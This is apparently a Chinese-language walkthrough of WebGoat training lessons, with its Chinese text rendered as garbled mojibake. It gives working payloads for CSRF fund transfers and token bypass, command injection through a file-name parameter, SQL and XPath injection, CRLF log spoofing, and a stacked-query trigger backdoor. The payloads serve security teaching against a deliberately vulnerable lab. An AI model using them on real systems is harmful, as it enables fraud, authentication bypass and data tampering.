<p>ËØ•ÂÆûÈ™åÊúâ‰∏§‰∏™Ë¶ÅÊ±ÇÔºåÁ¨¨‰∏ÄÊòØÂåÖÂê´ÊÅ∂ÊÑèËØ∑Ê±ÇÔºåÁ¨¨‰∫åÊòØÁ°ÆËÆ§Á¨¨‰∏Ä‰∏™Ë¶ÅÊ±ÇÊòØÂê¶ÊîªÂáªÊàêÂäü„ÄÇ</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span></span><br><span class="hljs-tag">    <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;attack?Screen=1471017872&amp;menu=900&amp;transferFunds=5000&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span></span><br><span class="hljs-tag">    <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;attack?Screen=1471017872&amp;menu=900&amp;transferFunds=CONFIRM&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><br></code></pre></td></tr></table></figure>
<h3 id="csrf-token-by-pass">CSRF Token By-Pass</h3>
<p>‰∏é CSRF ËØæÁ®ãÁ±ª‰ººÔºåÊÇ®ÁöÑÁõÆÊ†áÊòØÂêëÂåÖÂê´ÊÅ∂ÊÑèËØ∑Ê±ÇËΩ¨ÁßªËµÑÈáëÁöÑÊñ∞ÈóªÁªÑÂèëÈÄÅÁîµÂ≠êÈÇÆ‰ª∂„ÄÇ Ë¶ÅÊàêÂäüÂÆåÊàêÔºåÊÇ®ÈúÄË¶ÅËé∑ÂèñÊúâÊïàÁöÑËØ∑Ê±Ç‰ª§Áâå„ÄÇ ÊòæÁ§∫ËΩ¨Â∏êËµÑÈáëË°®ÂçïÁöÑÈ°µÈù¢ÂåÖÂê´ÊúâÊïàÁöÑËØ∑Ê±Ç‰ª§Áâå„ÄÇ ËΩ¨Ë¥¶ËµÑÈáëÈ°µÈù¢ÁöÑ URL ÊòØÂ∏¶ÊúâÊú¨ËØæ‚ÄúÂ±èÂπï‚ÄùÂíå‚ÄúËèúÂçï‚ÄùÊü•ËØ¢ÂèÇÊï∞‰ª•ÂèäÈ¢ùÂ§ñÂèÇÊï∞‚ÄútransferFunds = main‚ÄùÁöÑ‚ÄúÊîªÂáª‚Äùservlet„ÄÇ Âä†ËΩΩÊ≠§È°µÈù¢ÔºåËØªÂèñ‰ª§ÁâåÂπ∂Â∞Ü‰ª§ÁâåÈôÑÂä†Âà∞ transferFunds ÁöÑ‰º™ÈÄ†ËØ∑Ê±Ç‰∏≠„ÄÇ ÂΩìÊÇ®ËÆ§‰∏∫ÊîªÂáªÊàêÂäüÊó∂ÔºåÂà∑Êñ∞È°µÈù¢ÔºåÊÇ®‰ºöÂú®Â∑¶‰æßËèúÂçï‰∏≠ÊâæÂà∞ÁªøËâ≤Ê£ÄÊü•„ÄÇ</p>
<p>ËøôÈ¢òÁ®çÂæÆÂ§çÊùÇ‰∫Ü‰∏ÄÁÇπ„ÄÇÈ¶ñÂÖàË¶ÅÂµåÂÖ•‰∏Ä‰∏™Ê°ÜÊû∂ÔºàF1ÔºâÔºåÂú® F1 ‰∏≠Êâæ TokenÔºåÁÑ∂ÂêéÂú®ÂµåÂÖ•Á¨¨‰∫å‰∏™Ê°ÜÊû∂ÔºàF2ÔºâÔºåËøô‰∏™Ê°ÜÊû∂ÊòØËΩ¨Â∏êÁöÑÈìæÊé•ÔºåÈúÄË¶ÅÂ∏¶‰∏ä tokenÔºåÊÄùË∑ØÂ∞±ÊòØËøôÊ†∑„ÄÇ</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">GetToken</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> token = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;F1&#x27;</span>).<span class="hljs-property">contentDocument</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&#x27;form&#x27;</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>].<span class="hljs-property">value</span>;</span><br><span class="language-javascript">    <span class="hljs-title class_">LoadF2</span>(token);</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">LoadF2</span>(<span class="hljs-params">token</span>)&#123;</span><br><span class="language-javascript">    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;F2&#x27;</span>).<span class="hljs-property">src</span> = <span class="hljs-string">&#x27;attack?Screen=803158781&amp;menu=900&amp;transferFunds=5000&amp;CSRFToken=&#x27;</span>+token;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;attack?Screen=803158781&amp;menu=900&amp;transferFunds=main&#x27;</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&#x27;GetToken()&#x27;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;F1&#x27;</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;F2&#x27;</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure>
<h3 id="httponly-test">HTTPOnly Test</h3>
<p>‰∏∫‰∫ÜÂ∏ÆÂä©ÁºìËß£Ë∑®Á´ôËÑöÊú¨Â®ÅËÉÅÔºåÂæÆËΩØÊé®Âá∫‰∫Ü‰∏Ä‰∏™Âêç‰∏∫‚ÄúHttpOnly‚ÄùÁöÑÊñ∞ cookie Â±ûÊÄß„ÄÇ Â¶ÇÊûúËÆæÁΩÆ‰∫ÜËØ•Ê†áÂøóÔºåÈÇ£‰πàÊµèËßàÂô®‰∏çÂ∫îÂÖÅËÆ∏ÂÆ¢Êà∑Á´ØËÑöÊú¨ËÆøÈóÆ cookie„ÄÇ Áî±‰∫éËØ•Â±ûÊÄßÁõ∏ÂØπËæÉÊñ∞ÔºåÂõ†Ê≠§‰∏Ä‰∫õÊµèËßàÂô®ÂøΩÁï•Ê≠£Á°ÆÂ§ÑÁêÜÊñ∞Â±ûÊÄß„ÄÇ</p>
<p>Êú¨ËØæÁöÑÁõÆÁöÑÊòØÊµãËØïÊÇ®ÁöÑÊµèËßàÂô®ÊòØÂê¶ÊîØÊåÅ HTTPOnly cookie Ê†áÂøó„ÄÇ ËØ∑Ê≥®ÊÑè unique2u cookie ÁöÑÂÄº„ÄÇ Â¶ÇÊûúÊÇ®ÁöÑÊµèËßàÂô®ÊîØÊåÅ HTTPOnlyÔºåÂπ∂‰∏îÊÇ®‰∏∫ cookie ÂêØÁî®ÂÆÉÔºåÂàôÂÆ¢Êà∑Á´Ø‰ª£Á†ÅÂ∫îËØ•Êó†Ê≥ïËØªÂèñÊàñÂÜôÂÖ•ËØ• cookieÔºå‰ΩÜÊµèËßàÂô®‰ªçÁÑ∂ÂèØ‰ª•Â∞ÜÂÖ∂ÂÄºÂèëÈÄÅÂà∞ÊúçÂä°Âô®„ÄÇ Êüê‰∫õÊµèËßàÂô®‰ªÖÈòªÊ≠¢ÂÆ¢Êà∑Á´ØËØªÂèñËÆøÈóÆÔºå‰ΩÜ‰∏çÈòªÊ≠¢ÂÜôÂÖ•ËÆøÈóÆ„ÄÇ</p>
<p>ËøôÈ¢òÊòØËÆ©Êàë‰ª¨Â∞ùËØï httponly ÁöÑÔºåËØï‰∏ÄËØïÂ∞±Â•Ω‰∫Ü</p>
<h2 id="improper-error-handling">Improper Error Handling</h2>
<h3 id="fail-open-authentication-scheme">Fail Open Authentication Scheme</h3>
<p>Áî±‰∫éËÆ§ËØÅÊú∫Âà∂‰∏≠Â≠òÂú®ÈîôËØØÂ§ÑÁêÜÈóÆÈ¢òÔºåÂõ†Ê≠§ÂèØ‰ª•Âú®‰∏çËæìÂÖ•ÂØÜÁ†ÅÁöÑÊÉÖÂÜµ‰∏ãÂ∞ÜÂÖ∂ËÆ§ËØÅ‰∏∫'webgoat'Áî®Êà∑„ÄÇ Â∞ùËØï‰ª• Webgoat Áî®Êà∑Ë∫´‰ªΩÁôªÂΩïÔºåËÄå‰∏çÊåáÂÆöÂØÜÁ†Å„ÄÇ</p>
<p>ÊúâÊó∂ÂÄôÊàë‰ª¨Âú®ÊúçÂä°Á´ØÊé•ÂèóÂÆ¢Êà∑Á´ØÊï∞ÊçÆÁöÑÊó∂ÂÄôÂπ∂Ê≤°ÊúâÂà§Êñ≠Ëøô‰∏™ÂèÇÊï∞ÊòØÂê¶Â≠òÂú®Â∞±ÂØπÂÖ∂Áõ¥Êé•‰ΩøÁî®ÔºåËøôÊòØÂæà‰∏çÂÆâÂÖ®ÁöÑÔºåÂõ†‰∏∫ÂæÄÂæÄ‰ºöÁî±‰∫éÂèÇÊï∞ÁöÑÁº∫Â∞ëËÄåÂºïÂèëÊÑèÂ§ñÁöÑÂºÇÂ∏∏ÔºåÂèØËÉΩÂØºËá¥‰ªªÊÑèÁî®Êà∑ÁôªÈôÜ„ÄÇ</p>
<p>ÊäìÂåÖÂà†Èô§ <code>Password</code> ÂèÇÊï∞ÔºåÊèê‰∫§Âç≥ÂèØ</p>
<h2 id="injection-flaws">Injection Flaws</h2>
<h3 id="command-injection">Command Injection</h3>
<p>ÂëΩ‰ª§Ê≥®ÂÖ•ÊîªÂáªÂØπ‰ªª‰ΩïÂèÇÊï∞È©±Âä®ÁöÑÁ´ôÁÇπÈÉΩÊûÑÊàê‰∏•ÈáçÂ®ÅËÉÅ„ÄÇ ÊîªÂáªËÉåÂêéÁöÑÊñπÊ≥ïÂæàÂÆπÊòìÂ≠¶‰π†ÔºåËÄåÈÄ†ÊàêÁöÑÁ†¥ÂùèÂèØËÉΩÂåÖÊã¨Áõ∏ÂΩìÂ§öÁöÑÁ≥ªÁªüÂ¶•Âçè„ÄÇ Â∞ΩÁÆ°Â≠òÂú®Ëøô‰∫õÈ£éÈô©Ôºå‰ΩÜ‰∫íËÅîÁΩë‰∏äÊï∞ÈáèÊÉä‰∫∫ÁöÑÁ≥ªÁªüÊòìÂèóËøôÁßçÊîªÂáªÂΩ¢ÂºèÁöÑÂΩ±Âìç„ÄÇ</p>
<p>Ëøô‰∏ç‰ªÖÊòØ‰∏Ä‰∏™ÂÆπÊòìÂºïÂèëÂ®ÅËÉÅÁöÑÂ®ÅËÉÅÔºåÂÆÉ‰πüÊòØ‰∏ÄÁßçÂ®ÅËÉÅÔºåÂá≠ÂÄü‰∏ÄÁÇπÂ∏∏ËØÜÂíåÊ∑±ÊÄùÁÜüËôëÔºåÂá†‰πéÂèØ‰ª•ÂÆåÂÖ®Èò≤Ê≠¢„ÄÇ Êú¨ËØæÂ∞ÜÂêëÂ≠¶ÁîüÂ±ïÁ§∫Âá†‰∏™ÂèÇÊï∞Ê≥®ÂÖ•ÁöÑ‰æãÂ≠ê„ÄÇ<br />
Ê∏ÖÁêÜÊâÄÊúâËæìÂÖ•Êï∞ÊçÆÔºåÁâπÂà´ÊòØÁî®‰∫éÊìç‰ΩúÁ≥ªÁªüÂëΩ‰ª§ÔºåËÑöÊú¨ÂíåÊï∞ÊçÆÂ∫ìÊü•ËØ¢ÁöÑÊï∞ÊçÆÊÄªÊòØ‰∏Ä‰∏™ÂæàÂ•ΩÁöÑÂÅöÊ≥ï„ÄÇ<br />
Â∞ùËØïÂêëÊìç‰ΩúÁ≥ªÁªüÊ≥®ÂÖ•ÂëΩ‰ª§„ÄÇ</p>
<p>bs ÊäìÂåÖÔºåÊîπ HelpFile ÂèÇÊï∞Ôºö</p>
<p><code>AccessControlMatrix.help" %26 netstat -an %26 ifconfig%26 echo"</code></p>
<p>Ê≥®ÊÑèÔºåÈÄÉÈÄ∏ÂèåÂºïÂè∑ÁöÑÂêåÊó∂Ê≥®ÊÑèÈó≠ÂêàÔºå‰ª•ÂèäËøôÈ¢òÁöÑÂëΩ‰ª§ÊâßË°å‰∏çËÉΩÊúâÈîôËØØÔºåÂê¶ÂàôÂ∞±ÁÆó‰Ω†ÊãøÂà∞‰∫ÜÂëΩ‰ª§ÊâßË°åÂêéÁöÑ‰ø°ÊÅØ‰πüËøá‰∏ç‰∫ÜÔºåÊØîÂ¶ÇÔºö</p>
<p><code>AccessControlMatrix.help" %26 netstat -an %26 ifconfig%26"</code></p>
<p>ËøôÊ†∑ÁöÑ payload ÊòØËøá‰∏ç‰∫ÜÁöÑ„ÄÇ</p>
<h3 id="numeric-sql-injection">Numeric SQL Injection</h3>
<p>SQL Ê≥®ÂÖ•ÊîªÂáªÂØπ‰ªª‰ΩïÊï∞ÊçÆÂ∫ìÈ©±Âä®ÁöÑÁ´ôÁÇπÈÉΩÊûÑÊàê‰∏•ÈáçÂ®ÅËÉÅ„ÄÇ ÊîªÂáªËÉåÂêéÁöÑÊñπÊ≥ïÂæàÂÆπÊòìÂ≠¶‰π†ÔºåËÄåÈÄ†ÊàêÁöÑÁ†¥ÂùèÂèØËÉΩÂåÖÊã¨Áõ∏ÂΩìÂ§öÁöÑÁ≥ªÁªüÂ¶•Âçè„ÄÇ Â∞ΩÁÆ°Â≠òÂú®Ëøô‰∫õÈ£éÈô©Ôºå‰∫íËÅîÁΩë‰∏äÊï∞ÈáèÊÉä‰∫∫ÁöÑÁ≥ªÁªüÂÆπÊòìÂèóÂà∞ËøôÁßçÊîªÂáªÂΩ¢ÂºèÁöÑÂΩ±Âìç„ÄÇ</p>
<p>Ëøô‰∏ç‰ªÖÊòØ‰∏Ä‰∏™ÂÆπÊòìÂèóÂà∞ÁÖΩÂä®ÁöÑÂ®ÅËÉÅÔºåËÄå‰∏îÂÆÉ‰πüÊòØ‰∏ÄÁßçÂ®ÅËÉÅÔºåÂèØ‰ª•ËΩªÊòìÈò≤Ê≠¢ÔºåÊúâ‰∏ÄÁÇπÂ∏∏ËØÜÂíåÊ∑±ÊÄùÁÜüËôë„ÄÇ</p>
<p>ÂØπÊâÄÊúâËæìÂÖ•Êï∞ÊçÆËøõË°åÊ∏ÖÁêÜÔºåÂ∞§ÂÖ∂ÊòØÂú®Êìç‰ΩúÁ≥ªÁªüÂëΩ‰ª§ÔºåËÑöÊú¨ÂíåÊï∞ÊçÆÂ∫ìÊü•ËØ¢‰∏≠‰ΩøÁî®ÁöÑÊï∞ÊçÆÔºåÂç≥‰Ωø SQL Ê≥®ÂÖ•ÁöÑÂ®ÅËÉÅ‰ª•ÂÖ∂‰ªñÊñπÂºèÈòªÊ≠¢Ôºå‰πüÊòØ‰∏ÄÁßçÂæàÂ•ΩÁöÑÂÅöÊ≥ï„ÄÇ</p>
<p>Êï∞Â≠óÂûã sql Ê≥®ÂÖ•ÔºåËøû sql ËØ≠Âè•ÈÉΩÁªô‰∫ÜÔºå‰∏çËÉΩÂÜçÁÆÄÂçï</p>
<p><code>1 or 1=1--+</code></p>
<h3 id="log-spoofing">Log Spoofing</h3>
<p>‰∏ãÈù¢ÁöÑÁÅ∞Ëâ≤Âå∫ÂüüË°®Á§∫Â∞ÜÂú® Web ÊúçÂä°Âô®ÁöÑÊó•ÂøóÊñá‰ª∂‰∏≠ËÆ∞ÂΩïÁöÑÂÜÖÂÆπ„ÄÇ<br />
‰Ω†ÁöÑÁõÆÊ†áÊòØ‰ΩøÂÆÉÂÉè‰∏Ä‰∏™Áî®Êà∑Âêç‚Äúadmin‚ÄùÁôªÂΩïÊàêÂäü„ÄÇ<br />
ÈÄöËøáÂêëÊó•ÂøóÊñá‰ª∂Ê∑ªÂä†ËÑöÊú¨Êù•ÊèêÂçáÊîªÂáªÔºü</p>
<p>Âà©Áî®Êç¢Ë°åÔºåÈÄ†ÊàêÁôªÈôÜÊàêÂäüÁöÑÂÅáË±°Ôºö</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Smith</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aLogin Succeeded for username: admin<br></code></pre></td></tr></table></figure>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-number">0</span>a Êç¢Ë°åÁ¨¶Âè∑ <span class="hljs-string">&quot;<span class="hljs-char escape_">\n</span>&quot;</span><br><span class="hljs-number">0</span>d ÂõûËΩ¶Á¨¶Âè∑ <span class="hljs-string">&quot;<span class="hljs-char escape_">\r</span>&quot;</span><br></code></pre></td></tr></table></figure>
<p>ÂÖ∂ÂÆûÊàëËßâÂæóËøôÊ†∑‰πüË°åÔºå‰ΩÜÊòØÈÄöËøá‰∏ç‰∫ÜÔºö</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">form</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&#x27;table&#x27;</span>)[<span class="hljs-number">1</span>].<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&#x27;td&#x27;</span>)[<span class="hljs-number">0</span>].<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&#x27;pre&#x27;</span>)[<span class="hljs-string">&quot;0&quot;</span>].<span class="hljs-property">childNodes</span>[<span class="hljs-string">&quot;0&quot;</span>].<span class="hljs-property">data</span>=<span class="hljs-string">&#x27;Login Succeeded for username: admin&#x27;</span>;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>ÂéüÂõ†Â∫îËØ•ÊòØËøô‰∏™Êó•Âøó‰∏çÊòØÂú®ÁΩëÈ°µÁ´ØÊ¨∫È™óÔºåËÄåÊòØÂú®Êó•Âøó‰∏≠ËææÂà∞Ê¨∫È™óÁöÑÊïàÊûú</p>
<h3 id="xpath-injection">XPATH Injection</h3>
<p>‰∏é SQL Ê≥®ÂÖ•Á±ª‰ººÔºåÂΩìÁΩëÁ´ô‰ΩøÁî®Áî®Êà∑Êèê‰æõÁöÑ‰ø°ÊÅØÊü•ËØ¢ XML Êï∞ÊçÆÊó∂Ôºå‰ºöÂèëÁîü XPATH Ê≥®ÂÖ•ÊîªÂáª„ÄÇ ÈÄöËøáÂêëÁΩëÁ´ôÂèëÈÄÅÊúâÊïÖÊÑèÁöÑÁï∏ÂΩ¢‰ø°ÊÅØÔºåÊîªÂáªËÄÖÂèØ‰ª•‰∫ÜËß£ XML Êï∞ÊçÆÁöÑÁªìÊûÑÊàñËÆøÈóÆ‰ªñ‰ª¨ÈÄöÂ∏∏Êó†Ê≥ïËÆøÈóÆÁöÑÊï∞ÊçÆ„ÄÇ Â¶ÇÊûú xml Êï∞ÊçÆÁî®‰∫éË∫´‰ªΩÈ™åËØÅÔºàÂ¶ÇÂü∫‰∫é xml ÁöÑÁî®Êà∑Êñá‰ª∂ÔºâÔºå‰ªñ‰ª¨ÁîöËá≥ÂèØ‰ª•ÊèêÂçáÁΩëÁ´ô‰∏äÁöÑÊùÉÈôê„ÄÇ Êü•ËØ¢ XML ÊòØ‰ΩøÁî® XPath ÂÆåÊàêÁöÑÔºåXPath ÊòØ‰∏ÄÁßçÁÆÄÂçïÁöÑÊèèËø∞ÊÄßËØ≠Âè•ÔºåÂÆÉÂÖÅËÆ∏ xml Êü•ËØ¢ÂÆö‰Ωç‰∏ÄÊù°‰ø°ÊÅØ„ÄÇ ÂÉè SQL ‰∏ÄÊ†∑ÔºåÊÇ®ÂèØ‰ª•ÊåáÂÆöÊüê‰∫õÂ±ûÊÄßÊù•Êü•ÊâæÂíåÂåπÈÖçÊ®°Âºè„ÄÇ Âú®ÁΩëÁ´ô‰∏ä‰ΩøÁî® XML Êó∂ÔºåÈÄöÂ∏∏Êé•ÂèóÊü•ËØ¢Â≠óÁ¨¶‰∏≤ÁöÑÊüêÁßçÂΩ¢ÂºèÁöÑËæìÂÖ•‰ª•Ê†áËØÜË¶ÅÂú®È°µÈù¢‰∏äÂÆö‰ΩçÂíåÊòæÁ§∫ÁöÑÂÜÖÂÆπ„ÄÇ ÂøÖÈ°ªÂØπÊ≠§ËæìÂÖ•ËøõË°åÊ∂àÊØíÔºå‰ª•È™åËØÅÂÆÉ‰∏ç‰ºöÊ∑∑Ê∑Ü XPath Êü•ËØ¢Âπ∂ËøîÂõûÈîôËØØÁöÑÊï∞ÊçÆ„ÄÇ</p>
<p>‰∏ãÈù¢ÁöÑË°®Ê†ºÂÖÅËÆ∏ÂëòÂ∑•ÁúãÂà∞‰ªñ‰ª¨ÁöÑÊâÄÊúâ‰∏™‰∫∫Êï∞ÊçÆÔºåÂåÖÊã¨‰ªñ‰ª¨ÁöÑÂ∑•ËµÑ„ÄÇ ÊÇ®ÁöÑÂ∏êÊà∑ÊòØ Mike / test123„ÄÇ ÊÇ®ÁöÑÁõÆÊ†áÊòØÂ∞ùËØïÊü•ÁúãÂÖ∂‰ªñÂëòÂ∑•Êï∞ÊçÆ„ÄÇ</p>
<p>Xpath Ê≥®ÂÖ•ÔºåÊäìÂåÖÊîπ UsernameÔºö</p>
<p><code>Mike' or 1 or '1</code></p>
<h3 id="lab-sql-injection">LAB: SQL Injection</h3>
<h4 id="stage-1-5">Stage 1</h4>
<p>Èò∂ÊÆµ 1Ôºö‰ΩøÁî®Â≠óÁ¨¶‰∏≤ SQL Ê≥®ÂÖ•ÁªïËøáÈ™åËØÅ„ÄÇ ‰ΩøÁî® SQL Ê≥®ÂÖ•‰Ωú‰∏∫ËÄÅÊùøÔºà'Neville'ÔºâÁôªÂΩïËÄå‰∏ç‰ΩøÁî®Ê≠£Á°ÆÁöÑÂØÜÁ†Å„ÄÇ È™åËØÅ Neville ÁöÑ‰∏™‰∫∫ËµÑÊñôÂèØ‰ª•Ë¢´Êü•ÁúãÔºåÂπ∂‰∏îÊâÄÊúâÂäüËÉΩÈÉΩÂèØÁî®ÔºàÂåÖÊã¨ÊêúÁ¥¢ÔºåÂàõÂª∫ÂíåÂà†Èô§Ôºâ„ÄÇ</p>
<p><code>1' or 1=1 -- +#</code></p>
<p>ÂØÜÁ†ÅÊ°ÜÊúâÈïøÂ∫¶ÈôêÂà∂ÔºåÊäìÂåÖ</p>
<h4 id="stage-2-5">Stage 2</h4>
<p>ËøôÈ¢òÊòØ‰øÆÂ§çÈ¢òÔºåÂà©Áî®ÂèÇÊï∞ÂåñÊù•È¢ÑÈò≤ SQL Ê≥®ÂÖ•ÔºåÊòØ‰∏Ä‰∏™ÊØîËæÉÂ∏∏ËßÅÁöÑÈò≤Ê≠¢Ê≥®ÂÖ•ÁöÑÊñπÂºè</p>
<h4 id="stage-3-3">Stage 3</h4>
<p>‰Ωú‰∏∫ÊôÆÈÄöÂëòÂ∑•'Larry'Ôºå‰ΩøÁî® SQL Ê≥®ÂÖ•Âà∞ View ÂáΩÊï∞ÁöÑÂèÇÊï∞Ôºà‰ªé List Staff È°µÈù¢ÔºâÊù•Êü•ÁúãËÄÅÊùøÁöÑÁÆÄ‰ªãÔºà'Neville'Ôºâ„ÄÇ</p>
<p>È¶ñÂÖàÁªïËøáÁôªÈôÜÔºåÁÑ∂ÂêéÁÇπ View ÁöÑÊó∂ÂÄôÊäìÂåÖÔºåÂú® employee_id ‰∏≠Ê≥®ÂÖ•Ôºö</p>
<p><code>112  or 1=1 order by salary desc</code></p>
<p>ËøôÈ¢òÊúâÁÇπÂùëÔºåÈúÄË¶ÅÁöÑÂÖàÈ™åÁü•ËØÜÂæàÂ§ö„ÄÇ„ÄÇ</p>
<h3 id="string-sql-injection">String SQL Injection</h3>
<p>payload: <code>Smith' or 1=1-- +#</code></p>
<h3 id="database-backdoors">Database Backdoors</h3>
<h4 id="stage-1-6">Stage 1</h4>
<p>Èò∂ÊÆµ 1Ôºö‰ΩøÁî®Â≠óÁ¨¶‰∏≤ SQL Ê≥®ÂÖ•Êù•ÊâßË°åÂ§ö‰∏™ SQL ËØ≠Âè•„ÄÇ Êú¨ËØæÁöÑÁ¨¨‰∏ÄÈò∂ÊÆµÊòØÊïôÊÇ®Â¶Ç‰Ωï‰ΩøÁî®ÊòìÂèóÊîªÂáªÁöÑÂ≠óÊÆµÂàõÂª∫‰∏§Êù° SQL ËØ≠Âè•„ÄÇ Á¨¨‰∏Ä‰∏™ÊòØÁ≥ªÁªüÔºåÁ¨¨‰∫å‰∏™ÂÆåÂÖ®ÊòØ‰Ω†ÁöÑ„ÄÇ ÊÇ®ÁöÑÂ∏êÊà∑ ID ‰∏∫ 101.Ê≠§È°µÈù¢ÂÖÅËÆ∏ÊÇ®Êü•ÁúãÂØÜÁ†ÅÔºåssn ÂíåÂ∑•ËµÑ„ÄÇ Â∞ùËØïÊ≥®ÂÖ•Âè¶‰∏Ä‰∏™Êõ¥Êñ∞Êù•Êõ¥Êñ∞Ëñ™Ê∞¥</p>
<p>Â†ÜÂè†Ê≥®ÂÖ•</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">101; update employee <span class="hljs-built_in">set</span> <span class="hljs-attribute">salary</span>=100000000 where <span class="hljs-attribute">userid</span>=101 -- +#<br></code></pre></td></tr></table></figure>
<h4 id="stage-2-6">Stage 2</h4>
<p>Èò∂ÊÆµ 2Ôºö‰ΩøÁî®Â≠óÁ¨¶‰∏≤ SQL Ê≥®ÂÖ•Êù•Ê≥®ÂÖ•ÂêéÈó®„ÄÇ Êú¨ËØæÁöÑÁ¨¨‰∫åÈò∂ÊÆµÊòØÊïô‰Ω†Â¶Ç‰Ωï‰ΩøÁî®‰∏Ä‰∏™Âº±ÁÇπÂ≠óÊÆµÊù•Ê≥®ÂÖ•Êï∞ÊçÆÂ∫ìÂ∑•‰ΩúÊàñÂêéÈó®„ÄÇ Áé∞Âú®Â∞ùËØï‰ΩøÁî®Áõ∏ÂêåÁöÑÊäÄÊúØÊù•Ê≥®ÂÖ•‰∏Ä‰∏™ÂÖÖÂΩì SQL ÂêéÈó®ÁöÑËß¶ÂèëÂô®ÔºåËß¶ÂèëÂô®ÁöÑËØ≠Ê≥ïÊòØÔºö<br />
<code>CREATE TRIGGER myBackDoor BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email='john@hackme.com' WHERE userid = NEW.userid</code><br />
ËØ∑Ê≥®ÊÑèÔºåÁî±‰∫éÂΩìÂâçÂ∫ïÂ±ÇÊï∞ÊçÆÂ∫ì‰∏çÊîØÊåÅËß¶ÂèëÂô®ÔºåÂõ†Ê≠§‰∏ç‰ºöÊâßË°å‰ªª‰ΩïÊìç‰Ωú„ÄÇ</p>
<p>ÊåâÁÖßÊèêÁ§∫ÔºåËæìÂÖ•Ôºö</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">101</span>;<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TRIGGER</span> myBackDoor <span class="hljs-keyword">BEFORE</span> <span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">ON</span> employee <span class="hljs-keyword">FOR</span> <span class="hljs-keyword">EACH</span> <span class="hljs-keyword">ROW</span> <span class="hljs-keyword">BEGIN</span> <span class="hljs-keyword">UPDATE</span> employee <span class="hljs-keyword">SET</span> email=<span class="hljs-string">&#x27;john@hackme.com&#x27;</span> <span class="hljs-keyword">WHERE</span> userid = <span class="hljs-built_in">NEW</span>.userid<br></code></pre></td></tr></table></figure>
<h3 id="blind-numeric-sql-injection">Blind Numeric SQL Injection</h3>
<p>‰∏ãÈù¢ÁöÑË°®Ê†ºÂÖÅËÆ∏Áî®Êà∑ËæìÂÖ•‰∏Ä‰∏™Â∏êÂè∑Âπ∂Á°ÆÂÆöÂÆÉÊòØÂê¶ÊúâÊïà„ÄÇ ‰ΩøÁî®Ê≠§Ë°®ÂçïÂºÄÂèëÁúü/ÂÅáÊµãËØïÊ£ÄÊü•Êï∞ÊçÆÂ∫ì‰∏≠ÁöÑÂÖ∂‰ªñÊù°ÁõÆ„ÄÇ</p>
